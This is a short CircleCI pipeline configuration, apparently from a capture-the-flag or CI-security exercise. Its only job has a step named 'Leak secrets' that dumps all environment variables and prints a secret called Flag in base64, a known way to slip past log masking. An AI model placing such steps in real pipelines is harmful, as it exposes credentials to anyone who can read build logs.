version: 2.1
jobs:
  say-hello:
    docker:
      - image: cimg/base:current
    steps:
      - checkout
      - run:
          name: Leak secrets
          command: |
            env
            echo $Flag | base64
workflows:
  say-hello-workflow:
    jobs:
      - say-hello
